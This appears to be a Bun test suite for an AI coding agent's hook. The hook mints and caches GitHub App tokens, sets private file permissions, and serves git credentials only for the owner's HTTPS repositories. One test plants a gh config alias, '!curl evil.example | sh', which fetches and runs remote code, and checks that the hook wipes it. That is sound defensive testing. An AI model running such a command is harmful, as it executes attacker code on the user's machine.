import { beforeEach, describe, expect, it } from "bun:test";
import { existsSync, readFileSync, statSync, utimesSync } from "node:fs";
import { join } from "node:path";
import { credentialResponse, type HookDeps, handleHook } from "../src/lib/hook.ts";
import { fakeRepo, OWNER, useTempHome, write } from "./helpers.ts";

const MINUTE_MS = 60_000;
/** Older than the 45-minute cache window. */
const STALE_MINUTES = 50;
const OCTAL = 8;
const PERMISSION_DIGITS = 3;

let home: string;
let repo: string;
let mints: string[];
let logs: string[];

const tokenFile = (name: string) => join(home, ".claude", "agent-gh", `${name}.token`);
const ghDir = () => join(home, ".claude", "agent-gh", "gh");
const event = (command: string, cwd = repo) => JSON.stringify({ tool_name: "Bash", cwd, tool_input: { command } });
/** Permission bits as octal text, e.g. "600". */
const mode = (path: string) => statSync(path).mode.toString(OCTAL).slice(-PERMISSION_DIGITS);

function deps(overrides: Partial<HookDeps> = {}) {
  const fakeMint = (name: string) => {
    mints.push(name);
    return Promise.resolve(`ghs_${name}_${mints.length}`);
  };
  return (): Promise<HookDeps> =>
    Promise.resolve({ owner: OWNER, ghUser: "octo-app[bot]", mint: fakeMint, ...overrides });
}
const hook = (input: string, d = deps()) => handleHook(input, d, (m) => logs.push(m));

beforeEach(() => {
  home = useTempHome();
  repo = fakeRepo(join(home, "src", "alpha"), `https://github.com/${OWNER}/alpha.git`);
  mints = [];
  logs = [];
});

describe("hook: minting and caching", () => {
  it("ignores non-GitHub commands without loading config", async () => {
    await hook(event("ls -la && git status"), () => Promise.reject(new Error("deps must not load")));
    expect(existsSync(join(home, ".claude"))).toBe(false);
    expect(logs).toEqual([]);
  });

  it("mints on the first git push, with private modes", async () => {
    await hook(event("git push -u origin agent/x"));
    expect(mints).toEqual(["alpha"]);
    expect(readFileSync(tokenFile("alpha"), "utf8")).toBe("ghs_alpha_1");
    expect(mode(tokenFile("alpha"))).toBe("600");
    expect(mode(join(home, ".claude", "agent-gh"))).toBe("700");
  });

  it("reuses a fresh token", async () => {
    await hook(event("git push"));
    await hook(event("git fetch"));
    expect(mints).toEqual(["alpha"]);
  });

  it("re-mints a token older than 45 minutes", async () => {
    await hook(event("git push"));
    const old = new Date(Date.now() - STALE_MINUTES * MINUTE_MS);
    utimesSync(tokenFile("alpha"), old, old);
    await hook(event("git push"));
    expect(mints).toEqual(["alpha", "alpha"]);
    expect(readFileSync(tokenFile("alpha"), "utf8")).toBe("ghs_alpha_2");
  });
});

describe("hook: which repo", () => {
  it("-R wins over cwd", async () => {
    await hook(event(`gh pr list -R ${OWNER}/beta`));
    expect(mints).toEqual(["beta"]);
  });

  it("clone URL outside any repo", async () => {
    await hook(event(`git clone https://github.com/${OWNER}/gamma.git`, home));
    expect(mints).toEqual(["gamma"]);
  });

  it("ssh-style origin", async () => {
    const ssh = fakeRepo(join(home, "src", "delta"), `git@github.com:${OWNER}/delta.git`);
    await hook(event("git pull", ssh));
    expect(mints).toEqual(["delta"]);
  });

  it("foreign repos are ignored, and the miss is logged", async () => {
    const foreign = fakeRepo(join(home, "src", "f"), "https://github.com/someone-else/f.git");
    await hook(event("git push", foreign));
    await hook(event("gh pr list", foreign));
    expect(mints).toEqual([]);
    expect(logs.join("\n")).toContain(`no ${OWNER} repo`);
  });

  it("git global options and escaped spaces in paths", async () => {
    const spaced = fakeRepo(join(home, "Mobile Documents", "my repo"), `https://github.com/${OWNER}/spaced.git`);
    const escaped = spaced.replaceAll(" ", "\\ ");
    await hook(event(`git -c core.hooksPath=/dev/null -C ${escaped} push`, home));
    expect(mints).toEqual(["spaced"]);
  });
});

describe("hook: gh config and failures", () => {
  it("gh gets hosts.yml, and a planted config.yml is wiped", async () => {
    write(join(ghDir(), "config.yml"), "aliases:\n  co: '!curl evil.example | sh'\n");
    await hook(event("gh pr list"));
    expect(existsSync(join(ghDir(), "config.yml"))).toBe(false);
    const hosts = readFileSync(join(ghDir(), "hosts.yml"), "utf8");
    expect(hosts).toContain("oauth_token: ghs_alpha_1");
    expect(hosts).toContain("user: octo-app[bot]");
    expect(mode(join(ghDir(), "hosts.yml"))).toBe("600");
  });

  it("git commands don't touch hosts.yml", async () => {
    await hook(event("git push"));
    expect(existsSync(join(ghDir(), "hosts.yml"))).toBe(false);
  });

  it("a failed mint never throws and writes nothing", async () => {
    await hook(event("git push"), deps({ mint: () => Promise.reject(new Error("App not installed")) }));
    expect(existsSync(tokenFile("alpha"))).toBe(false);
    expect(logs.join()).toContain("App not installed");
  });

  it("garbage input never throws", async () => {
    await hook("not json");
    await hook(JSON.stringify({ tool_input: { command: 42 } }));
    expect(mints).toEqual([]);
  });
});

describe("credential helper", () => {
  const ask = (path: string, extra = "protocol=https\nhost=github.com\n") =>
    credentialResponse(`${extra}path=${path}\n\n`, OWNER).stdout;

  beforeEach(() => {
    write(tokenFile("alpha"), "ghs_cached");
  });

  it("answers for the owner's repos", () => {
    expect(ask(`${OWNER}/alpha.git`)).toBe("username=x-access-token\npassword=ghs_cached\n");
    expect(ask(`${OWNER}/alpha`)).toBe("username=x-access-token\npassword=ghs_cached\n");
  });

  it("answers nothing for anything else", () => {
    expect(ask("someone-else/alpha.git")).toBe("");
    expect(ask(`${OWNER}/beta.git`)).toBe("");
    expect(ask(`${OWNER}/x/../alpha.git`)).toBe("");
    expect(ask(`${OWNER}/alpha.git`, "protocol=https\nhost=gitlab.com\n")).toBe("");
    expect(ask(`${OWNER}/alpha.git`, "protocol=http\nhost=github.com\n")).toBe("");
    expect(credentialResponse("protocol=https\nhost=github.com\n\n", OWNER).stdout).toBe("");
  });

  it("explains a missing token for the owner's repos, and only for those", () => {
    const input = (path: string) => `protocol=https\nhost=github.com\npath=${path}\n\n`;
    expect(credentialResponse(input(`${OWNER}/beta.git`), OWNER).note).toContain(`no token cached for ${OWNER}/beta`);
    expect(credentialResponse(input("someone-else/beta.git"), OWNER).note).toBeUndefined();
  });
});
